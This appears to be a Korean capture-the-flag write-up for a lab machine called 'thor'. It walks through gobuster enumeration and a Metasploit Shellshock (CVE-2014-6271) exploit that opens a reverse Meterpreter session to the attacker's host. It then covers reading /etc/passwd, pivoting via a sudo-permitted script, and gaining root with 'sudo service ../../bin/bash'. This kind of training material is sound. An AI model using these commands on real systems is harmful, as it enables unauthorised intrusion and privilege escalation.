# 💥 CTF thor

<img width="349" height="498" alt="Image" src="https://github.com/user-attachments/assets/999d0bf6-b983-4e41-a7c7-5d7ab5c60212" /> <br/>

<img width="378" height="165" alt="Image" src="https://github.com/user-attachments/assets/ab3b3225-7f79-499f-9ff3-a98c849d74ce" /> <br/>

<img width="929" height="778" alt="Image" src="https://github.com/user-attachments/assets/e70b7066-98f4-4af1-9f82-e561fc3cdd5d" /> <br/>


---

### 💥 Metasploit — Shellshock 공격 (CVE-2014-6271)

---

#### 🔍 왜 Metasploit으로 직행하나?

보안 업계의 공식 공식 체인:

> **`/cgi-bin/` 디렉터리** + **`.sh` / `.cgi` 확장자 파일** = **Shellshock 취약점 타깃**

Shellshock은 bash가 환경변수를 파싱할 때 뒤에 붙은 명령어까지 실행해버리는 취약점. CGI 스크립트는 웹 요청의 헤더를 환경변수로 bash에 넘기기 때문에, `/cgi-bin/` 안에 `.sh` 파일이 있으면 거의 확정적으로 이 루트를 시도한다.

---

#### 🕷️ Step 1. gobuster로 cgi-bin 발견

```bash
# 1차 — 루트 디렉터리 열거
gobuster dir -u http://172.16.11.229/ \
  -w /usr/share/wordlists/dirb/common.txt
# → /cgi-bin/ 디렉터리 발견

# 2차 — cgi-bin 안쪽 열거 (.sh 확장자 지정)
gobuster dir -u http://172.16.11.229/cgi-bin/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x sh,cgi
# → shell.sh 발견
#   (EOF 에러가 떠도 shell.sh가 리스트에 나오면 존재하는 것)
```

> 💡 `unexpected EOF` 에러는 gobuster가 스캔 도중 연결이 끊긴 것. shell.sh가 목록에 보이면 무시하고 진행해도 됨.

---

#### 💥 Step 2. Metasploit — Shellshock 익스플로잇

```bash
sudo msfconsole

search shellshock
use 1

set rhost 172.16.11.229          # 공격 대상 CTF 서버 IP
set targeturi /cgi-bin/shell.sh  # 발견한 CGI 스크립트 경로
set lhost 172.16.11.213          # 공격자(Kali) IP
set lport 4545                   # 포트 충돌 방지용 변경

exploit
# → Meterpreter 세션 획득
```

---

#### 🐚 Step 3. 쉘 안정화

```bash
meterpreter > shell

# 프롬프트가 안 나와도 바로 입력
SHELL=/bin/bash script -q /dev/null
# → 안정적인 bash 쉘 획득
```

<img width="424" height="158" alt="Image" src="https://github.com/user-attachments/assets/c7c8333a-528e-404f-ad6a-5566b52db016" />


---

#### 👤 Step 4. thor 계정 확인 & 권한 상승

```bash
# /etc/passwd로 로그인 가능한 계정 확인
cat /etc/passwd | grep bash
# → thor 계정 발견 (비밀번호 힌트도 여기서 파악)

# thor 소유 스크립트 실행
sudo -u thor /home/thor/./hammer.sh

Enter Thor Secret Key :            # thor 입력 후 엔터
Please enter your Secret massage : # bash 입력 후 엔터
# → thor 권한의 bash 쉘 획득
```

<img width="838" height="738" alt="Image" src="https://github.com/user-attachments/assets/33527c49-13a5-4ec9-8d97-c7cea08e4dfb" />

---

#### 👑 Step 5. root 권한 상승

```bash
sudo -l
# 출력:
# (root) NOPASSWD: /usr/sbin/service
# → service 명령어를 root 권한으로 비밀번호 없이 실행 가능

# GTFOBins 기법 — path traversal로 /bin/bash를 root로 실행
sudo service ../../bin/bash

whoami    # root
cd /root
```

<img width="923" height="827" alt="Image" src="https://github.com/user-attachments/assets/c352e713-0d86-4b2b-9571-e6c74c1a1fdc" />
ls        # proof.txt 확인!
```

> 💡 `sudo service ../../bin/bash` 원리: `service`가 내부적으로 경로를 조합해 실행할 때 `../` 트래버설을 막지 않아서 `/bin/bash`를 root 권한으로 직접 실행시킬 수 있음.
